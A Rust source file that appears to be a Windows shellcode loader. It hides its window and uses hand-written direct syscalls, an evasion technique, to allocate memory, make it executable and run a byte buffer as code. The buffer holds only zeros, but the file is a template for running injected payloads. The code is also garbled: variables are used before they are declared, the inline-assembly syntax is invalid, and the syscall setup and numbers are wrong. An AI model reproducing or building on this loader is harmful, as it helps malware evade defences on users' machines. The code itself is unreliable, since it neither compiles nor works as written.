#![windows_subsystem = "windows"]

use std::mem;
use std::ptr;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::NTSTATUS;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::winnt::{
    MEM_COMMIT, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_READWRITE,
};

macro_rules! syscall {
    ($syscall_number:expr) => {{
        let result: NTSTATUS;
        unsafe {
            asm!(
                "mov eax, {syscall_number}",
                "mov edx, 0x7ffe0300", // Arbitrary non-zero value
                "syscall",
                "mov dword ptr [rsp], eax",
                out("eax") result,
            );
        }
        result
    }};
    ($syscall_number:expr, $($arg:expr),*) => {{
        let result: NTSTATUS;
        unsafe {
            asm!(
                "mov eax, {syscall_number}",
                $(
                    "mov {}, {}",
                    lateout("rcx") $arg,
                    in(reg) $arg,
                )*
                "syscall",
                "mov dword ptr [rsp], eax",
                out("eax") result,
            );
        }
        result
    }};
}

fn main() {
    let array_size = 10;
    let buffer: Vec<u8> = vec![0; array_size];

    // Allocate memory
    let mem_ptr = unsafe {
        syscall!(
            0x18, // NtAllocateVirtualMemory syscall number
            GetCurrentProcess(),
            &mut mem_ptr as *mut *mut c_void,
            0,
            &mut array_size as *mut usize,
            MEM_COMMIT,
            PAGE_READWRITE
        );
        mem_ptr
    };

    if mem_ptr.is_null() {
        panic!("Memory allocation failed");
    }

    // Write the byte array to the allocated memory
    unsafe {
        ptr::copy_nonoverlapping(buffer.as_ptr(), mem_ptr as *mut u8, array_size);
    }

    // Change memory protection to allow execution
    let old_protect: usize = 0;
    unsafe {
        syscall!(
            0x19, // NtProtectVirtualMemory syscall number
            GetCurrentProcess(),
            &mut mem_ptr as *mut *mut c_void,
            &mut array_size as *mut usize,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect as *mut usize,
        );
    }

    // Cast the address to a function pointer and execute it
    let func_ptr = mem_ptr as *const ();
    let func: extern "C" fn() = unsafe { std::mem::transmute(func_ptr) };
    func();

    // Free the allocated memory
    unsafe {
        syscall!(
            0x1A, // NtFreeVirtualMemory syscall number
            GetCurrentProcess(),
            &mut mem_ptr as *mut *mut c_void,
            &mut array_size as *mut usize,
            MEM_RELEASE
        );
    }
}
